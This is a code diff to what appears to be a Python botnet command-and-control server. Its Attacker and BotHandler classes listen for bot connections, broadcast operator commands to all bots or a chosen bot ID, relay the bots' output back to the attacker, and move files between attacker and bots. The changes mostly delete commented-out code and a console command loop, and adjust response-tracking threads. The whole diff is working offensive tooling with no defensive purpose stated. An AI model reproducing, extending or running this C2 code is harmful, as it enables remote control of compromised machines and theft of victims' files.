@@ -87,26 +87,6 @@ class Attacker(threading.Thread):
 
         self.send_respond(respond)
 
-        """while True:
-            respond = ''
-            for val in self.respond_list:
-                respond += val
-            len_respond = str(len(respond))
-
-            if len(bot_list) == len(self.respond_list) and bot_id == '0':
-                self.client.send(len_respond.encode('utf-8'))
-                time.sleep(2)
-                self.client.send(respond.encode('utf-8'))
-                break
-
-            elif len(self.respond_list) > 0 and bot_id != '0':
-                self.client.send(len_respond.encode('utf-8'))
-                time.sleep(2)
-                self.client.send(respond.encode('utf-8'))
-                break
-
-        respond_list = [] """
-
     def reply_cmd(self, cmd, bot_id):
 
         if self.cmd_exist(cmd):
@@ -122,8 +102,9 @@ class Attacker(threading.Thread):
                 self.send_respond(respond)
 
             else:
-                respond_tracker = threading.Thread(target=self.respond_tracker, args=(bot_id,))
-                respond_tracker.start()
+                if cmd[:2] != 'cp' and cmd[:4] != 'send':
+                    respond_tracker = threading.Thread(target=self.respond_tracker, args=(bot_id,))
+                    respond_tracker.start()
 
                 if bot_id != '0':  # if any id of bot is received then add the id to cmd and put it to q
                     if cmd[:2] == 'cp' or cmd[:4] == 'send':
@@ -227,8 +208,6 @@ def listener(lhost, lport, q_commands, respond_q):
 
     print("[+] Starting listener on tcp://" + lhost + ":" + str(lport) + "\n")
     print('[+] Starting listener on tcp://' + lhost + ':' + str(8081) + '\n')
-    # BotCmdThread = BotCmd(q)
-    # BotCmdThread.start()
 
     attacker_thread = Attacker(lhost, 8081, q_commands, respond_q)
     attacker_thread.start()
@@ -238,30 +217,6 @@ def listener(lhost, lport, q_commands, respond_q):
         newthread = BotHandler(client, client_address, q_commands, attacker_thread, respond_q)
         Socketthread.append(newthread)
         newthread.start()
-
-
-class BotCmd(threading.Thread):  # Inheriting from threding.Thread
-    def __init__(self, qv2):
-        threading.Thread.__init__(self)  # Overriding constructor of Thread class
-        self.q = qv2
-
-    def run(self):
-        while True:
-            sendCmd = str(input("BotCmd> "))
-            if sendCmd == "":
-                pass
-            elif sendCmd == "exit":
-                for i in range(len(Socketthread)):
-                    time.sleep(0.1)
-                    self.q.put(sendCmd)
-                time.sleep(5)
-                os._exit(0)
-            else:
-                print("[+] Sending Command: " + sendCmd + " to " + str(len(Socketthread)) + " bots")
-                for i in range(len(Socketthread)):
-                    time.sleep(0.1)
-                    self.q.put(sendCmd)
-
 
 clean_cmd = lambda cmd: cmd if '|' not in cmd else cmd[0: cmd.find('|')]
 
@@ -329,43 +284,32 @@ class BotHandler(threading.Thread):
     def transfer_file(self, command):
         try:
             client_v, client_a = self.build_transfer_tcp()
-
             # first need to get the confirmation that file exists
-
             exist = client_v.recv(1024).decode('utf-8')
             client_a.send(exist.encode('utf-8'))
             client_s = client_a
             client_r = client_v
             if exist == "T":
-
                 if 'send' in command:
                     client_r = client_a
                     client_s = client_v
-
                 data = client_r.recv(1024)
                 while data:
                     print('Receiving...')
                     client_s.send(data)
-
                     data = client_r.recv(1024)
             else:
                 client_s.shutdown(socket.SHUT_WR)
                 client_s.close()
-
         except Exception as ex:
             print(ex)
             print('Done.../')
-
             client_a.shutdown(socket.SHUT_WR)
             client_a.close()
-        # client_a.shutdown(socket.SHUT_WR)
-        # client_a.close()
 
     def get_response(self, bot_name):
-        length = self.bot_client.recv(5000).decode('utf-8')  # flaw (5000)
+        length = self.bot_client.recv(5000).decode('utf-8')
         print('Length:  ' + length)
-        # att_client.send(length.encode('utf-8'))
-
         i = 0
         recv_val = ''
         val = ''
@@ -377,10 +321,8 @@ class BotHandler(threading.Thread):
 
         recv_val = '[+] (Bot ID: ' + str(bot_name[bot_name.find('-') + 1:]) + ') ' + recv_val + '\n'
         respond_q.put(recv_val)
-        # respond_list.append(recv_val)
         print("Respond ...\\n" + recv_val)
         time.sleep(2)
-        # att_client.send(recv_val.encode('utf-8'))
 
     def send_response(self, att_client):
         respond = ''
@@ -400,16 +342,12 @@ class BotHandler(threading.Thread):
         thread_tracker.start()
 
         while self.alive:
-
             recv_bot_cmd = self.q_commands.get()
 
             if '|' not in recv_bot_cmd or bot_name[bot_name.find('-') + 1:] == recv_bot_cmd[
                                                                                recv_bot_cmd.find('|') + 1:]:
-
                 recv_bot_cmd = clean_cmd(recv_bot_cmd)
-
                 print('\n' + recv_bot_cmd + '.....')
-
                 try:
                     self.bot_client.send(recv_bot_cmd.encode('utf-8'))  # send the command to bot
                     att_client = self.attacker_thread.get_client()
@@ -418,19 +356,7 @@ class BotHandler(threading.Thread):
                         self.transfer_file(recv_bot_cmd)
                     else:
                         self.get_response(bot_name)
-                        """ len_botlist = len(bot_list)
-                        if len(respond_list) == len(bot_list):
-                            self.send_response(att_client) """
-                        """recv_val = (self.bot_client.recv(5000)).decode('utf-8')
-                        print(recv_val)
-                        recv_val = '[+] (Bot ID: ' + str(bot_name[bot_name.find('-') + 1:]) + ') ' + recv_val
-
-                        att_client.send(recv_val.encode('utf-8')) """
-
                 except Exception as ex:
-                    """ print('done')
-                    att_client.shutdown(socket.SHUT_WR)
-                    att_client.close() """
                     print(ex)
                     break
 
